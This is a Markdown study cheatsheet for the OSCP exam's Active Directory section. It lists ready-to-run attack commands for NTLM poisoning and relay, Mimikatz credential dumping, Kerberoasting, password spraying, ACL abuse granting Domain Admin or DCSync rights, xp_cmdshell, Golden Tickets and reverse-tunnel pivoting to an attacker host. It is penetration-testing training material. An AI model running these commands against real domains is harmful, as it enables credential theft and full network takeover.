# OSCP / OSCP+ Active Directory Only Master Cheatsheet

> **Scope**: Active Directory attacks only. Windows and Linux local privilege escalation are covered in separate cheatsheets.
>
> **Official AD references**: PEN-200 Ch. 21 (AD Enumeration), Ch. 22 (AD Authentication Attacks), Ch. 23 (Lateral Movement in AD).
>
> **AD set format**: 3 machines, 10 + 10 + 20 = 40 points. Assumed-breach credentials provided at start.
>
> **Explicitly excluded**: ADCS (ESC1–ESC10), certificate template abuse. Not in official PEN-200 outline.

---

## Master Table

| # | Technique | **Required Access Level** | How to Identify | Output Validation | Exploitation Approach | Tool Commands | Priority |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | **LLMNR/NBT-NS Poisoning + NTLM Relay** | **Network position** on same L2 segment as victims (no creds needed) | `responder -I eth0 -A` (analyze mode) shows broadcast LLMNR/NBT-NS/mDNS queries. `nxc smb <subnet> --gen-relay-list targets.txt` finds hosts with SMB signing disabled | Responder log shows `NetNTLMv2-SSP Hash` with victim account. Relay succeeds when `ntlmrelayx` prints `Authenticating against smb://<target> SUCCEED` | Poison name resolution → capture NetNTLMv2 → crack offline (hashcat 5600) OR relay to SMB/LDAP targets without signing | **Capture**: `responder -I eth0 -wv` → `hashcat -m 5600 captured.txt rockyou.txt` ; **Relay**: set Responder.conf `SMB=Off`, `HTTP=Off` → `ntlmrelayx.py -tf targets.txt -smb2support` ; **mitm6**: `mitm6 -d domain.local` + `ntlmrelayx.py -6 -t ldaps://<DC_IP> --add-computer` | **High** |
| 2 | **Assumed Breach (WinRM/RDP/SMB)** | **Domain user credentials** (provided) | Provided domain credentials | `nxc winrm` = `Pwn3d!` ; `evil-winrm` connects ; `xfreerdp` prompts desktop | Establish foothold on first AD machine (usually dual-homed) | `nxc winrm <IP> -u <user> -p <pass>` ; `evil-winrm -i <IP> -u <user> -p '<pass>'` ; `xfreerdp /u:<user> /p:<pass> /v:<IP>` | **High** |
| 3 | **SeImpersonate on AD Host** | **Local user on AD host** (no admin needed) | `whoami /priv` on foothold | `SeImpersonatePrivilege` = **Enabled** | PrintSpoofer/GodPotato → SYSTEM on AD host | `.\PrintSpoofer64.exe -i -c "powershell -ep bypass"` ; `.\GodPotato.exe -cmd "cmd /c whoami"` | **High** |
| 4 | **Mimikatz LSASS** | **Local Administrator / SYSTEM** on AD host | SYSTEM on AD host | `sekurlsa::logonpasswords` returns NTLM/plaintext for logged-on domain users | Harvest domain user creds → PtH | `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | **High** |
| 5 | **Mimikatz SAM** | **Local Administrator / SYSTEM** on AD host | SYSTEM on AD host | `lsadump::sam` returns local Administrator hash | Harvest local admin hash → local admin on other hosts | `.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` | **High** |
| 6 | **Mimikatz Cached Domain Creds** | **Local Administrator / SYSTEM** on AD host | SYSTEM on AD host | `lsadump::cache` returns mscash2 hashes | Crack offline (hashcat 2100) → plaintext domain creds | `.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` → `hashcat -m 2100 hash.txt rockyou.txt` | **High** |
| 7 | **C:\windows.old (SAM/SYSTEM)** | **Local user** with read access to `C:\windows.old` | `dir C:\windows.old\Windows\System32\config\SAM` shows file exists and is readable | Files exist and readable | Dump old SAM/SYSTEM → local hashes not rotated | `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` | Medium |
| 8 | **PowerShell History on AD Host** | **Local user** (own history) or **admin** (other users' history) | `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` (PowerShell) or `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` (cmd) | Plaintext passwords / `runas /savecred` commands | Reuse creds for lateral movement | `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | **High** |
| 9 | **BloodHound / SharpHound** | **Domain user** (any authenticated user) | Run SharpHound on compromised host | Graph shows ACL edges, local admin, sessions, Kerberoastable, AS-REP, shortest path to DA | Analyze for: **GenericAll**, **WriteDACL**, **ForceChangePassword**, **AddMember**, **DCSync**, local admin | `Invoke-BloodHound -CollectionMethod All` → transfer ZIP to Kali → import into BloodHound | **High** |
| 10 | **PowerView Manual Enum** | **Domain user** (any authenticated user) | `Get-DomainUser -SPN` ; `Get-DomainUser -PreauthNotRequired` ; `Find-InterestingDomainAcl -ResolveGUIDs` ; `Get-DomainTrust` ; `Find-LocalAdminAccess` | SPN users, pre-auth-not-required users, exploitable ACLs, trusts, local admin access | Identify paths not caught by BloodHound | `Get-DomainUser -SPN` ; `Find-InterestingDomainAcl -ResolveGUIDs` ; `Find-LocalAdminAccess` | **High** |
| 11 | **NetExec Enumeration** | **Domain user** (any authenticated user) | `nxc smb <DC> -u <user> -p <pass> --users` ; `nxc smb <IP> -u <user> -p <pass> --shares` ; `nxc smb <IP> -u <user> -p <pass> --pass-pol` | `--users` builds userlist; `--shares` finds readable shares; `--pass-pol` shows lockout threshold | Build target lists, validate creds, find share creds | `nxc smb <DC> -u <user> -p <pass> --users` ; `nxc smb <IP> -u <user> -p <pass> --shares` ; `nxc smb <IP> -u <user> -p <pass> --pass-pol` | **High** |
| 12 | **AS-REP Roasting** | **Any domain user OR no creds** (just username list) | `Get-DomainUser -PreauthNotRequired` ; `nxc ldap <DC> -u <user> -p <pass> --asreproast asrep.txt` | Hashcat **18200** cracks AS-REP hash | Request AS-REP → crack offline | `impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -request` → `hashcat -m 18200 asrep.txt rockyou.txt` | **High** |
| 13 | **Kerberoasting** | **Any domain user** (any authenticated user) | `Get-DomainUser -SPN` ; `nxc ldap <DC> -u <user> -p <pass> --kerberoasting kerb.txt` | Hashcat **13100** cracks TGS-REP hash | Request TGS → crack offline → service account password | `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request` → `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule` | **High** |
| 14 | **Password Spraying** | **Any domain user OR no creds** (username list) | `nxc smb <DC> -u <user> -p <pass> --pass-pol` shows lockout threshold | `[+]` valid creds across hosts; `Pwn3d!` for admin | Spray single password across userlist (respect lockout) | `nxc smb <IP_range> -u users.txt -p 'Welcome1' --continue-on-success` | **High** |
| 15 | **ACL: GenericAll on User** | **Domain user** with **GenericAll** edge on target user | BloodHound `GenericAll` edge to target user | Edge confirmed | Reset password → authenticate as target. Or set SPN → Kerberoast | `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)` | **High** |
| 16 | **ACL: GenericAll / WriteDACL on Group** | **Domain user** with **GenericAll/WriteDACL** on group | BloodHound `GenericAll`/`WriteDACL` on `Domain Admins`/`Account Operators` | Edge confirmed | Add self to group → re-login → DA | `Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>` ; `Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync` | **High** |
| 17 | **ACL: ForceChangePassword** | **Domain user** with **ForceChangePassword** edge on target | BloodHound `ForceChangePassword` edge | Edge confirmed | Reset target password → authenticate as target | `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)` | **High** |
| 18 | **ACL: WriteDACL → DCSync** | **Domain user** with **WriteDACL** on domain object | BloodHound `WriteDACL` on domain object | Edge confirmed | Grant self DCSync → dump hashes | `Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync` → `impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc-ntlm` | **High** |
| 19 | **ACL: AddMember (Group)** | **Domain user** with **AddMember** edge to privileged group | BloodHound `AddMember` edge | Edge confirmed | Add self/controlled user to group | `Add-DomainGroupMember -Identity '<Group>' -Members <user>` | **High** |
| 20 | **ACL: GPO Abuse** | **Domain user** with **GenericWrite** on GPO linked to privileged OU | BloodHound `GenericWrite` on GPO | Edge confirmed | Push local admin / scheduled task via GPO | `SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net localgroup administrators <user> /add" --GPOName "<GPO>"` | Medium |
| 21 | **GPP Passwords (cpassword)** | **Domain user** with read access to SYSVOL | `Get-GPPPassword` in PowerView | `Groups.xml` in SYSVOL with `cpassword` | Decrypt AES key → local admin password | `Get-GPPPassword` | **High** |
| 22 | **Pass-the-Hash** | **NTLM hash** of a domain user (from Mimikatz/secretsdump) | NTLM hash from Mimikatz/secretsdump | `nxc smb <IP> -u <user> -H <hash>` = `Pwn3d!` | Impacket PtH / evil-winrm PtH | `impacket-psexec <domain>/<user>@<IP> -hashes :<NTLM>` ; `evil-winrm -i <IP> -u <user> -H <NTLM>` | **High** |
| 23 | **WinRM / RDP with Creds** | **Plaintext credentials** of a domain user | Plaintext creds from cracking/spraying | `nxc winrm` = `Pwn3d!` ; `evil-winrm` connects ; `xfreerdp` prompts | Interactive shell/desktop on target hosts | `evil-winrm -i <IP> -u <user> -p '<pass>'` ; `xfreerdp /u:<user> /p:<pass> /v:<IP>` | **High** |
| 24 | **MSSQL Impersonation + xp_cmdshell** | **MSSQL login** (local SQL auth or domain user with SQL access) | Compromised `sql_svc` or MSSQL login; `nxc mssql <IP> -u <user> -p <pass> -M enum_impersonate --local-auth` | `enum_impersonate` shows `sa` impersonation ability | `EXECUTE AS LOGIN='sa'` → enable `xp_cmdshell` → OS commands | `impacket-mssqlclient <domain>/<user>@<IP> -windows-auth` → `EXECUTE AS LOGIN='sa';` → `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` → `EXEC xp_cmdshell 'whoami'` | **High** |
| 25 | **SMB Shares (Credential Hunting)** | **Domain user** with read access to shares | `nxc smb <IP> -u <user> -p <pass> --shares` | Readable shares contain scripts/configs/`passwords.txt` | Mount share → search creds → reuse for lateral movement | `smbclient //<IP>/<share> -U <user>%<pass>` | **High** |
| 26 | **DCSync** | **Domain Admin** OR **account with Replicating Directory Changes + Replicating Directory Changes All** | DA or `DS-Replication-Get-Changes` rights; BloodHound DCSync edge | `secretsdump -just-dc-ntlm` returns all hashes incl. `krbtgt` | Simulate DC replication → dump all domain hashes | `impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc-ntlm` | **High** |
| 27 | **Golden Ticket** | **`krbtgt` NTLM hash** (from DCSync) + **Domain SID** | Have `krbtgt` NTLM hash | `kerberos::golden` creates TGT ; `klist` confirms | Forge TGT for fake DA → inject → access any resource | `mimikatz "kerberos::golden /sid:<SID> /domain:<domain> /ptt /rc4:<krbtgt_hash> /user:fakeadmin"` → `klist` | Medium |
| 28 | **Pivoting (Ligolo-ng / Chisel)** | **Local Administrator / SYSTEM** on dual-homed host (to install agent) | `ipconfig` on first AD host shows second NIC in internal subnet ; `netstat -ano` shows internal services | Internal subnet reachable only through dual-homed host | Tunnel Kali → internal subnet → MS02/DC01 | **Ligolo**: `linux_amd64-proxy -selfcert -laddr 0.0.0.0:443` → on MS01: `agent.exe -connect <KALI_IP>:443 -ignore-cert` → `sudo ip route add 10.10.118.0/24 dev ligolo` | **High** |

---

## Access Level Quick Reference

| Access Level | Techniques Available |
| :--- | :--- |
| **Network position (no creds)** | LLMNR/NBT-NS Poisoning + NTLM Relay, AS-REP Roasting (with username list), Password Spraying (with username list) |
| **Any domain user** | BloodHound/SharpHound, PowerView, NetExec enum, Kerberoasting, ACL abuse (if edge exists), GPP Passwords, SMB share hunting |
| **Local user on AD host** | SeImpersonate check, PowerShell history (own), `C:\windows.old` (if readable) |
| **Local Admin / SYSTEM on AD host** | Mimikatz (LSASS/SAM/cache), install Ligolo agent for pivoting |
| **NTLM hash** | Pass-the-Hash |
| **Plaintext domain creds** | WinRM/RDP |
| **MSSQL login** | MSSQL impersonation → xp_cmdshell |
| **Domain Admin OR DCSync rights** | DCSync → `krbtgt` → Golden Ticket |

---

## Output Validation Summary

- **`responder -I eth0 -A`**: Analyze mode shows LLMNR/NBT-NS/mDNS queries without poisoning. Switch to `-wv` to capture.
- **Responder capture log**: `NetNTLMv2-SSP Hash` + victim account → crack with `hashcat -m 5600`.
- **`nxc smb <subnet> --gen-relay-list targets.txt`**: Output lists hosts with `signing:False` → relay targets.
- **`ntlmrelayx.py`**: `Authenticating against smb://<target> SUCCEED` → relay worked.
- **`nxc winrm <IP> -u <user> -p <pass>`**: `Pwn3d!` = user in Remote Management Users → `evil-winrm` eligible.
- **`whoami /priv`**: `SeImpersonatePrivilege` = Enabled → PrintSpoofer/GodPotato → SYSTEM.
- **Mimikatz `sekurlsa::logonpasswords`**: NTLM/plaintext for logged-on users.
- **Mimikatz `lsadump::cache`**: mscash2 hashes for offline cracking (hashcat 2100).
- **BloodHound**: Shortest path to DA; look for **GenericAll**, **WriteDACL**, **ForceChangePassword**, **AddMember**, **DCSync** edges.
- **`Get-DomainUser -SPN`**: Kerberoastable accounts.
- **`Get-DomainUser -PreauthNotRequired`**: AS-REP roastable accounts.
- **`Find-InterestingDomainAcl -ResolveGUIDs`**: Exploitable ACLs not caught by BloodHound.
- **`nxc smb <DC> -u <user> -p <pass> --pass-pol`**: Lockout threshold → safe spraying.
- **`nxc smb <IP> -u <user> -p <pass> --shares`**: Readable shares may contain `passwords.txt` or configs.
- **`C:\windows.old`**: Historical SAM/SYSTEM → local hashes not rotated.
- **`ipconfig` dual-homed**: Second NIC reveals internal subnet for pivoting.

---

## AD Attack Chain Checklist (with Access Gates)

1. **Do I have provided creds or need to capture them?** → If creds provided: proceed. If not: `responder -I eth0 -A` → `responder -I eth0 -wv` / `ntlmrelayx.py` → crack/relay → obtain first domain creds.
2. **Can I access the first host with creds?** (Domain user) → `nxc winrm <IP> -u <user> -p <pass>` / `nxc smb <IP> -u <user> -p <pass>` / `nxc rdp <IP> -u <user> -p <pass>`
3. **Do I have SeImpersonatePrivilege?** (Local user on host) → `whoami /priv` → PrintSpoofer/GodPotato → SYSTEM
4. **What creds can I harvest locally?** (Local Admin/SYSTEM required) → Mimikatz (LSASS + SAM + **cache**), PS history, `C:\windows.old`
5. **What does BloodHound show?** (Domain user) → SharpHound → import → shortest path to DA → **note ACL edges**
6. **Are there Kerberoastable / AS-REP users?** (Domain user / no creds) → `impacket-GetUserSPNs` / `impacket-GetNPUsers` → crack offline
7. **Can I spray the userlist?** (No creds / Domain user) → `nxc smb <DC> -u <user> -p <pass> --pass-pol` → spray with `--continue-on-success`
8. **Can I abuse ACLs?** (Domain user with edge) → GenericAll / WriteDACL / ForceChangePassword / AddMember → execute
9. **Can I pivot?** (Local Admin/SYSTEM on dual-homed host) → `ipconfig` → Ligolo → internal subnet
10. **Can I MSSQL?** (MSSQL login) → `enum_impersonate` → `EXECUTE AS sa` → `xp_cmdshell`
11. **Can I DCSync?** (DA or DCSync rights) → `impacket-secretsdump -just-dc-ntlm` → `krbtgt` → Golden Ticket

---

## Quick Command Reference

| Purpose | Command |
| :--- | :--- |
| Responder analyze | `responder -I eth0 -A` |
| Responder capture | `responder -I eth0 -wv` |
| Crack NetNTLMv2 | `hashcat -m 5600 captured.txt rockyou.txt` |
| Generate relay targets | `nxc smb <subnet> --gen-relay-list targets.txt` |
| NTLM relay (SMB) | Set Responder.conf `SMB=Off`, `HTTP=Off` → `ntlmrelayx.py -tf targets.txt -smb2support` |
| mitm6 + relay | `mitm6 -d domain.local` → `ntlmrelayx.py -6 -t ldaps://<DC_IP> --add-computer` |
| WinRM access | `evil-winrm -i <IP> -u <user> -p '<pass>'` / `evil-winrm -i <IP> -u <user> -H <hash>` |
| SMB sweep | `nxc smb <IP> -u <user> -p <pass> --shares --users --pass-pol --continue-on-success` |
| WinRM spray | `nxc winrm <IP> -u users.txt -p passwords.txt --continue-on-success` |
| Local priv check | `whoami /priv` |
| PrintSpoofer | `.\PrintSpoofer64.exe -i -c "powershell -ep bypass"` |
| GodPotato | `.\GodPotato.exe -cmd "cmd /c whoami"` |
| Mimikatz LSASS | `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` |
| Mimikatz SAM | `.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` |
| Mimikatz cache | `.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` |
| BloodHound collect | `Invoke-BloodHound -CollectionMethod All` |
| PowerView SPN | `Get-DomainUser -SPN` |
| PowerView pre-auth | `Get-DomainUser -PreauthNotRequired` |
| PowerView ACLs | `Find-InterestingDomainAcl -ResolveGUIDs` |
| AS-REP Roast | `impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -request` |
| Kerberoast | `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request` |
| Crack AS-REP | `hashcat -m 18200 asrep.txt rockyou.txt` |
| Crack Kerberoast | `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule` |
| Crack cached creds | `hashcat -m 2100 hash.txt rockyou.txt` |
| Add to group | `Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>` |
| Reset password | `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)` |
| Grant DCSync | `Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <user> -Rights DCSync` |
| GPP passwords | `Get-GPPPassword` |
| Pass-the-Hash (psexec) | `impacket-psexec <domain>/<user>@<IP> -hashes :<NTLM>` |
| Pass-the-Hash (winrm) | `evil-winrm -i <IP> -u <user> -H <NTLM>` |
| MSSQL impersonation check | `nxc mssql <IP> -u <user> -p <pass> -M enum_impersonate --local-auth` |
| MSSQL impersonate + xp_cmdshell | `EXECUTE AS LOGIN='sa'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';` |
| DCSync | `impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc-ntlm` |
| Golden Ticket | `mimikatz "kerberos::golden /sid:<SID> /domain:<domain> /ptt /rc4:<krbtgt_hash> /user:fakeadmin"` |
| Ligolo proxy | `linux_amd64-proxy -selfcert -laddr 0.0.0.0:443` |
| Ligolo agent | `agent.exe -connect <KALI_IP>:443 -ignore-cert` |
| Ligolo route | `sudo ip route add <internal_subnet> dev ligolo` |
| PowerShell history (PowerShell) | `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| PowerShell history (cmd) | `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |

---

## Exam Rules (AD-Specific)

- **AD set weight**: 40 points (Machine 1: 10 + Machine 2: 10 + Machine 3/DC: 20).
- **Pivoting**: May be required. Anything in PEN-200 is examinable.
- **Metasploit**: Only **one** target machine. Cannot be used for pivoting.
- **Allowed tools**: BloodHound (Legacy/Community), SharpHound, PowerView, Rubeus, evil-winrm, NetExec/CrackMapExec, Mimikatz, Impacket, PrintSpoofer, Ligolo-ng, Chisel, Responder, ntlmrelayx, mitm6.
- **PSSession**: PowerShell Core counts as interactive shell — allowed.
- **Scoring change (Dec 2026+)**: OSCP+ moves to equated scaled scoring (400/500). **Do not stop at 70 raw points** — attempt every machine and submit every flag.
- **ADCS**: Not in official PEN-200 outline. **Do not prepare.**

---

## GitHub Usage Tips

1. Save as `OSCP-Active-Directory-Only-Cheatsheet.md`
2. Keep `\|` escapes in Markdown tables
3. Branch per AD practice target (e.g., `git checkout -b htb-forest`)
4. Do **not** add ADCS/ESC1–ESC10 rows — explicitly out of scope
